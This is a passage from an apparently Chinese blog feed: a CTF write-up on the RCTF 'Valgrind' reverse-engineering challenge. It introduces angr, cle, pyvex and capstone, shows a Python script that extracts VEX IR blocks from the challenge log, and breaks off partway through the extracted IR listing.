    <span class="token keyword">return</span> self<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>符号执行</category>
        <category>Angr</category>
      </categories>
      <tags>
        <tag>符号执行</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF Valgrind</title>
    <url>/2021/07/19/rctf_valgrind/</url>
    <content><![CDATA[<h1 id="Valgrind"><a href="#Valgrind" class="headerlink" title="Valgrind"></a>Valgrind</h1><p>给的是 angr.SimState 对象在执行过程中输出的日志。<br>由于网上资料也比较多，或许有些杂乱，我也做一些介绍。让大家也能快速上手。暂时就探索到这，有空再看看源码，再深入一些。</p>
<blockquote>
<p>Angr : A powerful and user-friendly binary analysis platform!</p>
</blockquote>
<h2 id="一些介绍"><a href="#一些介绍" class="headerlink" title="一些介绍"></a>一些介绍</h2><p>配置 angr 环境 <a href="https://docs.angr.io/introductory-errata/install">https://docs.angr.io/introductory-errata/install</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">## 对于我的 wsl2 </span>
<span class="token function">git</span> clone https://github.com/angr/angr-dev
<span class="token builtin class-name">cd</span> angr-dev
./setup.sh -i -e angr
<span class="token comment">## 要是有包下不来，挂个代理，或者手动下，都可以</span>
<span class="token comment">## 接下来要配置 ~/.bashrc</span>
<span class="token builtin class-name">export</span> WORK_HOME <span class="token operator">=</span> ~/.vituralenvs
<span class="token builtin class-name">source</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> / -name <span class="token string">"virtualenvwrapper.sh"</span><span class="token variable">)</span></span>
<span class="token comment">## 这个也可以手动设置路径</span>
<span class="token comment">## 发现 angr venv 中导入不了 angr</span>
<span class="token comment">## 可以在 angr venv 中使用 pip install -e angr</span>
<span class="token comment">## pip 的 -e 参数，还不大清楚，简单的说似乎是路径选择</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>由浅入深。<br>我们先来用 angr 来载入一下程序。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">In <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: <span class="token function">import</span> monkeyhex,cle,pyvex

In <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>: ld <span class="token operator">=</span> cle.Loader<span class="token punctuation">(</span><span class="token string">"/bin/true"</span><span class="token punctuation">)</span>

In <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>: data <span class="token operator">=</span> ld.memory.load<span class="token punctuation">(</span>ld.main_object.entry,0x100<span class="token punctuation">)</span>

In <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>: data
Out<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>: b<span class="token string">'1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05*2\x00\x00H\x8d\r\xb31\x00\x00H\x8d=\x1c\xff\xff\xff\xff\x15\xfeW \x00\xf4\x0f\x1fD\x00\x00H\x8d=\x99X \x00UH\x8d\x05\x91X \x00H9\xf8H\x89\xe5t\x19H\x8b\x05\xd2W \x00H\x85\xc0t\r]\xff\xe0f.\x0f\x1f\x84\x00\x00\x00\x00\x00]\xc3\x0f\x1f@\x00f.\x0f\x1f\x84\x00\x00\x00\x00\x00H\x8d=YX \x00H\x8d5RX \x00UH)\xfeH\x89\xe5H\xc1\xfe\x03H\x89\xf0H\xc1\xe8?H\x01\xc6H\xd1\xfet\x18H\x8b\x05\x99W \x00H\x85\xc0t\x0c]\xff\xe0f\x0f\x1f\x84\x00\x00\x00\x00\x00]\xc3\x0f\x1f@\x00f.\x0f\x1f\x84\x00\x00\x00\x00\x00\x80=1X \x00\x00u/H\x83=oW \x00\x00UH\x89\xe5t\x0cH\x8b=zW \x00\xe8M\xfe\xff\xff\xe8H\xff\xff\xff\xc6\x05\tX \x00\x01]\xc3\x0f\x1f\x80\x00\x00\x00\x00\xf3\xc3f\x0f\x1fD\x00\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>第一步，加载。此时二进制文件已经通过 cle 加载到到内存了。这里暂时不提动态链接器，当然动态链接器可以存在，没了的话一些跳转的函数就不能到正确的位置了。</p>
<pre class="line-numbers language-none"><code class="language-none">In [5]: irsb &#x3D; pyvex.lift(data,ld.main_object.entry,ld.main_object.arch)

In [6]: irsb
Out[6]: IRSB &lt;0x2a bytes, 11 ins., &lt;Arch AMD64 (LE)&gt;&gt; at 0x4017b0

In [7]: irsb.pp()
IRSB &#123;
   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I64 t4:Ity_I64 t5:Ity_I64 t6:Ity_I64 t7:Ity_I64 t8:Ity_I64 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64 t14:Ity_I64 t15:Ity_I32 t16:Ity_I64 t17:Ity_I64 t18:Ity_I64 t19:Ity_I64 t20:Ity_I32 t21:Ity_I64 t22:Ity_I32 t23:Ity_I64 t24:Ity_I64 t25:Ity_I64 t26:Ity_I64 t27:Ity_I64 t28:Ity_I64 t29:Ity_I64 t30:Ity_I64 t31:Ity_I64 t32:Ity_I64 t33:Ity_I64 t34:Ity_I64 t35:Ity_I64 t36:Ity_I64

   00 | ------ IMark(0x4017b0, 2, 0) ------
   01 | PUT(rbp) &#x3D; 0x0000000000000000
   02 | ------ IMark(0x4017b2, 3, 0) ------
   03 | t26 &#x3D; GET:I64(rdx)
   04 | PUT(r9) &#x3D; t26
   05 | PUT(rip) &#x3D; 0x00000000004017b5
   06 | ------ IMark(0x4017b5, 1, 0) ------
   07 | t4 &#x3D; GET:I64(rsp)
   08 | t3 &#x3D; LDle:I64(t4)
   09 | t27 &#x3D; Add64(t4,0x0000000000000008)
   10 | PUT(rsi) &#x3D; t3
   11 | ------ IMark(0x4017b6, 3, 0) ------
   12 | PUT(rdx) &#x3D; t27
   13 | ------ IMark(0x4017b9, 4, 0) ------
   14 | t5 &#x3D; And64(t27,0xfffffffffffffff0)
   15 | PUT(cc_op) &#x3D; 0x0000000000000014
   16 | PUT(cc_dep1) &#x3D; t5
   17 | PUT(cc_dep2) &#x3D; 0x0000000000000000
   18 | PUT(rip) &#x3D; 0x00000000004017bd
   19 | ------ IMark(0x4017bd, 1, 0) ------
   20 | t8 &#x3D; GET:I64(rax)
   21 | t29 &#x3D; Sub64(t5,0x0000000000000008)
   22 | PUT(rsp) &#x3D; t29
   23 | STle(t29) &#x3D; t8
   24 | PUT(rip) &#x3D; 0x00000000004017be
   25 | ------ IMark(0x4017be, 1, 0) ------
   26 | t31 &#x3D; Sub64(t29,0x0000000000000008)
   27 | PUT(rsp) &#x3D; t31
   28 | STle(t31) &#x3D; t29
   29 | ------ IMark(0x4017bf, 7, 0) ------
   30 | PUT(r8) &#x3D; 0x00000000004049f0
   31 | ------ IMark(0x4017c6, 7, 0) ------
   32 | PUT(rcx) &#x3D; 0x0000000000404980
   33 | ------ IMark(0x4017cd, 7, 0) ------
   34 | PUT(rdi) &#x3D; 0x00000000004016f0
   35 | PUT(rip) &#x3D; 0x00000000004017d4
   36 | ------ IMark(0x4017d4, 6, 0) ------
   37 | t17 &#x3D; LDle:I64(0x0000000000606fd8)
   38 | t33 &#x3D; Sub64(t31,0x0000000000000008)
   39 | PUT(rsp) &#x3D; t33
   40 | STle(t33) &#x3D; 0x00000000004017da
   41 | t35 &#x3D; Sub64(t33,0x0000000000000080)
   42 | &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; AbiHint(0xt35, 128, t17) &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
   NEXT: PUT(rip) &#x3D; t17; Ijk_Call
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>我们把这块数据，通过 lift 函数把他变成一块 irsb。这块 irsb 这里我把它称为 IR Block， 就是 VEX IR 的基本块，动态执行的时候为了兼容多个架构，angr 就会执行这一块，执行又会涉及到另外一个模块。</p>
<p>这里之所以要使用 data，addr，arch。可以看到每一段 IMark 都有表示 (地址，汇编长度，不知道是什么的一个变量)</p>
<p>还有另外一个 Block，是由 capstone 模块提供，而更底层我也没有挖掘过，只好使用 angr 集成的 Capstone 了。虽说它是反汇编模块，但是似乎没有提供直接的接口，我想是应该有个提供 data 或者 addr size 和 arch 输出反汇编的。这个我还得找找。这里的话我就按部就班的来了。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">In <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span>: p <span class="token operator">=</span> angr.Project<span class="token punctuation">(</span><span class="token string">"/bin/true"</span><span class="token punctuation">)</span>
WARNING <span class="token operator">|</span> <span class="token number">2021</span>-09-17 <span class="token number">23</span>:29:36,414 <span class="token operator">|</span> cle.loader <span class="token operator">|</span> The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
In <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span>: st <span class="token operator">=</span> p.factory.blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> ld.main_object.entry<span class="token punctuation">)</span>
In <span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span>: st.addr
Out<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span>: 0x4017b0
In <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span>: bb <span class="token operator">=</span> st.block<span class="token punctuation">(</span><span class="token punctuation">)</span>
In <span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span>: bb.pp<span class="token punctuation">(</span><span class="token punctuation">)</span>
0x4017b0:       xor     ebp, ebp
0x4017b2:       mov     r9, rdx
0x4017b5:       pop     rsi
0x4017b6:       mov     rdx, rsp
0x4017b9:       and     rsp, 0xfffffffffffffff0
0x4017bd:       push    rax
0x4017be:       push    rsp
0x4017bf:       lea     r8, <span class="token punctuation">[</span>rip + 0x322a<span class="token punctuation">]</span>
0x4017c6:       lea     rcx, <span class="token punctuation">[</span>rip + 0x31b3<span class="token punctuation">]</span>
0x4017cd:       lea     rdi, <span class="token punctuation">[</span>rip - 0xe4<span class="token punctuation">]</span>
0x4017d4:       call    qword ptr <span class="token punctuation">[</span>rip + 0x2057fe<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>接下来就是汇编以及一些可以用于解析的参数，略作展示。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">In <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">]</span>: bb.capstone
Out<span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">]</span>: <span class="token operator">&lt;</span>DisassemblerBlock <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">0</span>></span>

In <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">]</span>: bb.capstone.pp<span class="token punctuation">(</span><span class="token punctuation">)</span>
0x4017b0:       xor     ebp, ebp
0x4017b2:       mov     r9, rdx
0x4017b5:       pop     rsi
0x4017b6:       mov     rdx, rsp
0x4017b9:       and     rsp, 0xfffffffffffffff0
0x4017bd:       push    rax
0x4017be:       push    rsp
0x4017bf:       lea     r8, <span class="token punctuation">[</span>rip + 0x322a<span class="token punctuation">]</span>
0x4017c6:       lea     rcx, <span class="token punctuation">[</span>rip + 0x31b3<span class="token punctuation">]</span>
0x4017cd:       lea     rdi, <span class="token punctuation">[</span>rip - 0xe4<span class="token punctuation">]</span>
0x4017d4:       call    qword ptr <span class="token punctuation">[</span>rip + 0x2057fe<span class="token punctuation">]</span>

In <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span>: bb.capstone.insns
Out<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span>: 
<span class="token punctuation">[</span><span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"xor"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">0</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"mov"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">2</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"pop"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">5</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"mov"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">6</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"and"</span> <span class="token keyword">for</span> 0x4017b<span class="token operator"><span class="token file-descriptor important">9</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"push"</span> <span class="token keyword">for</span> 0x4017bd<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"push"</span> <span class="token keyword">for</span> 0x4017be<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"lea"</span> <span class="token keyword">for</span> 0x4017bf<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"lea"</span> <span class="token keyword">for</span> 0x4017c<span class="token operator"><span class="token file-descriptor important">6</span>></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"lea"</span> <span class="token keyword">for</span> 0x4017cd<span class="token operator">></span>,
 <span class="token operator">&lt;</span>DisassemblerInsn <span class="token string">"call"</span> <span class="token keyword">for</span> 0x4017d<span class="token operator"><span class="token file-descriptor important">4</span>></span><span class="token punctuation">]</span>

In <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span>: bb.capstone.insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.op_str
Out<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span>: <span class="token string">'ebp, ebp'</span>

In <span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>: bb.capstone.insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.insn
Out<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span>: <span class="token operator">&lt;</span>CsInsn 0x4017b0 <span class="token punctuation">[</span>31ed<span class="token punctuation">]</span>: xor ebp, ebp<span class="token operator">></span>

In <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span>: bb.capstone.insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.size
Out<span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span>: 0x2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>至此一小部分的静态分析的模块就介绍好了。</p>
<h2 id="接下来就可以直接做题啦233"><a href="#接下来就可以直接做题啦233" class="headerlink" title="接下来就可以直接做题啦233"></a>接下来就可以直接做题啦233</h2><p>我们看回标题，题目要求的就是分析 一堆 IRSB 俺就叫他 SB 好了(名词大师)而且我们也能比较清楚的看到每个 block 尾部都有跳转的地址，也可能有跳转的一些条件。block 的头部有一些寄存器(大概吧，应该可以称作寄存器)</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">IRSB &#123;
   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32

   00 | ------ IMark(0x8048464, 3, 0) ------
   01 | t2 &#x3D; GET:I32(esp)
   02 | t0 &#x3D; Sub32(t2,0x00000054)
   03 | PUT(cc_op) &#x3D; 0x00000006
   04 | PUT(cc_dep1) &#x3D; t2
   05 | PUT(cc_dep2) &#x3D; 0x00000054
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(eip) &#x3D; 0x08048467
   08 | ------ IMark(0x8048467, 5, 0) ------
   09 | t4 &#x3D; Sub32(t0,0x00000004)
   10 | PUT(esp) &#x3D; t4
   11 | STle(t4) &#x3D; 0x0804846c
   NEXT: PUT(eip) &#x3D; 0x080485f1; Ijk_Call
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>中间的每一段 IMark 就表示一段汇编转换成的 vex ir ，虽然但是，这个和他的汇编其实不等价，我们应该从一整个 blcok 来看他的 ir 或者 他的 汇编。这样才能理解他在干什么。</p>
<p>有关 vex ir 指令的一些<a href="https://github.com/smparkes/valgrind-vex/blob/master/pub/libvex_ir.h">注释</a>，还是可以食用的。</p>
<p>怎么产生的这一段，我们就可以看回之前调用过的 lift ，而 lift 当然是针对不同架构所建立的，也就是 lift 函数会被不同的架构所需要的 lift 重写。</p>
<p>题目很长，给了 4k 行，这其实不是很利于线性的分析。于是乎我们可以写一段 py 脚本提取一下。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> IPython

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./oldlog.log"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file1<span class="token punctuation">:</span>
    data <span class="token operator">=</span> file1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


target <span class="token operator">=</span> <span class="token string">"IMark\(([\w]*), \d, \d\)"</span>

res <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>target<span class="token punctuation">,</span>data<span class="token punctuation">)</span>

addr_int_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
addr_int_list<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>
addr_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> addr_int_list<span class="token punctuation">]</span>

addr_code <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> addr <span class="token keyword">in</span> addr_str_list<span class="token punctuation">:</span>
    target1 <span class="token operator">=</span> <span class="token string">'------ IMark\(%s, \d&#123;1,3&#125;, \d&#123;1,3&#125;\) ------\n([\w\W]*?)\n\&#125;'</span><span class="token operator">%</span>addr
    target2 <span class="token operator">=</span> <span class="token string">'------ IMark\(%s, \d&#123;1,3&#125;, \d&#123;1,3&#125;\) ------\n([\w\W]*?)   \d&#123;1,3&#125; \| ------ IMark'</span><span class="token operator">%</span>addr
    code1 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>target1<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
    code2 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>target2<span class="token punctuation">,</span>data<span class="token punctuation">)</span>

    <span class="token keyword">if</span> code1 <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> code2 <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> code1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>code2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> code2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> code2 <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> code1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> code1 <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> code2<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./newlog.log"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file2<span class="token punctuation">:</span>
    <span class="token keyword">for</span> addr <span class="token keyword">in</span> addr_str_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">==</span> <span class="token string">'0x8048554'</span> <span class="token keyword">or</span> addr <span class="token operator">==</span> <span class="token string">'0x8048552'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
        file2<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token keyword">and</span> addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            file2<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            file2<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>addr_code<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
    file2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>得到了如下 irsb 集合,不想看的话就可以忽略了233,直接跳转到下面</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x8048464
   01 | t2 &#x3D; GET:I32(esp)
   02 | t0 &#x3D; Sub32(t2,0x00000054)
   03 | PUT(cc_op) &#x3D; 0x00000006
   04 | PUT(cc_dep1) &#x3D; t2
   05 | PUT(cc_dep2) &#x3D; 0x00000054
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(eip) &#x3D; 0x08048467
0x8048467
   09 | t4 &#x3D; Sub32(t0,0x00000004)
   10 | PUT(esp) &#x3D; t4
   11 | STle(t4) &#x3D; 0x0804846c   # Write a value to memory
   NEXT: PUT(eip) &#x3D; 0x080485f1; Ijk_Call
0x804846c
   01 | t0 &#x3D; GET:I32(eax)
   02 | t2 &#x3D; Add32(t0,0x00001b94)
   03 | PUT(cc_op) &#x3D; 0x00000003
   04 | PUT(cc_dep1) &#x3D; t0
   05 | PUT(cc_dep2) &#x3D; 0x00001b94
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(eax) &#x3D; t2
   08 | PUT(eip) &#x3D; 0x08048471
0x8048471
   10 | t51 &#x3D; GET:I16(gs)
   11 | t50 &#x3D; 16Uto32(t51)
   12 | t5 &#x3D; GET:I64(ldt)
   13 | t6 &#x3D; GET:I64(gdt)
   14 | t52 &#x3D; x86g_use_seg_selector(t5,t6,t50,0x00000014):Ity_I64
   15 | t54 &#x3D; 64HIto32(t52)
   16 | t53 &#x3D; CmpNE32(t54,0x00000000)
   17 | if (t53) &#123; PUT(eip) &#x3D; 0x8048471; Ijk_MapFail &#125;
   18 | t55 &#x3D; 64to32(t52)
   19 | t56 &#x3D; LDle:I32(t55)
   20 | PUT(eip) &#x3D; 0x08048477
0x8048477
   22 | t58 &#x3D; GET:I32(ebp)
   23 | t57 &#x3D; Add32(t58,0xfffffff4)
   24 | STle(t57) &#x3D; t56
0x804847a
   26 | PUT(cc_op) &#x3D; 0x0000000f
   27 | PUT(cc_dep1) &#x3D; 0x00000000
   28 | PUT(cc_dep2) &#x3D; 0x00000000
   29 | PUT(cc_ndep) &#x3D; 0x00000000
   30 | PUT(eax) &#x3D; 0x00000000
   31 | PUT(eip) &#x3D; 0x0804847c
0x804847c
   33 | t60 &#x3D; Add32(t58,0xffffffce)
   34 | STle(t60) &#x3D; 0x656d3174
   35 | PUT(eip) &#x3D; 0x08048483
0x8048483
   37 | t62 &#x3D; Add32(t58,0xffffffd2)
   38 | STle(t62) &#x3D; 0x7530795f
   39 | PUT(eip) &#x3D; 0x0804848a
0x804848a
   41 | t64 &#x3D; Add32(t58,0xffffffd6)
   42 | STle(t64) &#x3D; 0x6a6e655f
   43 | PUT(eip) &#x3D; 0x08048491
0x8048491
   45 | t66 &#x3D; Add32(t58,0xffffffda)
   46 | STle(t66) &#x3D; 0x775f7930
   47 | PUT(eip) &#x3D; 0x08048498
0x8048498
   49 | t68 &#x3D; Add32(t58,0xffffffde)
   50 | STle(t68) &#x3D; 0x31743561
   51 | PUT(eip) &#x3D; 0x0804849f
0x804849f
   53 | t70 &#x3D; Add32(t58,0xffffffe2)
   54 | STle(t70) &#x3D; 0x775f676e
   55 | PUT(eip) &#x3D; 0x080484a6
0x80484a6
   57 | t72 &#x3D; Add32(t58,0xffffffe6)
   58 | STle(t72) &#x3D; 0x6e5f3561
   59 | PUT(eip) &#x3D; 0x080484ad
0x80484ad
   61 | t74 &#x3D; Add32(t58,0xffffffea)
   62 | STle(t74) &#x3D; 0x775f746f
   63 | PUT(eip) &#x3D; 0x080484b4
0x80484b4
   65 | t76 &#x3D; Add32(t58,0xffffffee)
   66 | STle(t76) &#x3D; 0x65743561
   67 | PUT(eip) &#x3D; 0x080484bb
0x80484bb
   69 | t78 &#x3D; Add32(t58,0xfffffff2)
   70 | STle(t78) &#x3D; 0x0064
   71 | PUT(eip) &#x3D; 0x080484c1
0x80484c1
   73 | t80 &#x3D; Add32(t58,0xffffffac)
   74 | STle(t80) &#x3D; 0x00000003
   75 | PUT(eip) &#x3D; 0x080484c8
0x80484c8
   77 | t82 &#x3D; Add32(t58,0xffffffb4)
   78 | STle(t82) &#x3D; 0x41
   79 | PUT(eip) &#x3D; 0x080484cc
0x80484cc
   81 | t84 &#x3D; Add32(t58,0xffffffb5)
   82 | STle(t84) &#x3D; 0x42
   83 | PUT(eip) &#x3D; 0x080484d0
0x80484d0
   85 | t86 &#x3D; Add32(t58,0xffffffb6)
   86 | STle(t86) &#x3D; 0x43
   87 | PUT(eip) &#x3D; 0x080484d4
0x80484d4
   89 | t88 &#x3D; Add32(t58,0xffffffb7)
   90 | STle(t88) &#x3D; 0x44
   91 | PUT(eip) &#x3D; 0x080484d8
0x80484d8
   93 | t90 &#x3D; Add32(t58,0xffffffb8)
